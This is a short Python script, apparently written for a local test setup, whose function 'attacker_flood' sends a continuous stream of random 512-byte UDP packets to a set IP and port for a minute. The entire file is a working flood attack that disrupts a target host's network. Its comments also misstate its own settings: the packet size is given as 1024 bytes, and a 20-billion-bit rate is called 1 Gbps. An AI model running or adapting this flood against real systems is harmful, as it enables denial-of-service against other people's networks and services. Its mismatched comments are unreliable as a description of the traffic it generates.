import socket
import random
import time

TARGET_IP = "10.247.52.4"  # Change to the local machine running UDP server
TARGET_PORT = 8080  # Matches the UDP server

PACKET_SIZE = 512  # Each packet is 1024 bytes
BANDWIDTH_LIMIT = 20_000_000_000  # 1 Gbps in bits
PACKETS_PER_SECOND = BANDWIDTH_LIMIT // (PACKET_SIZE * 8)  # Compute allowed packets/sec
INTERVAL = 1 / PACKETS_PER_SECOND  # Time delay per packet (in seconds)

def attacker_flood(duration=60):
    """
    Generates controlled UDP traffic to enforce 1 Gbps NIC contention.
    
    :param duration: Attack duration in seconds.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)  # Generate random bytes

    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time:
        start = time.time()
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        packet_count += 1

        # Sleep to maintain bandwidth control
        elapsed = time.time() - start
        sleep_time = max(0, INTERVAL - elapsed)
        time.sleep(sleep_time)

        if packet_count % 1000 == 0:
            print(f"Sent {packet_count} packets at 1 Gbps")

    print("Attacker finished.")

if __name__ == "__main__":
    attacker_flood()

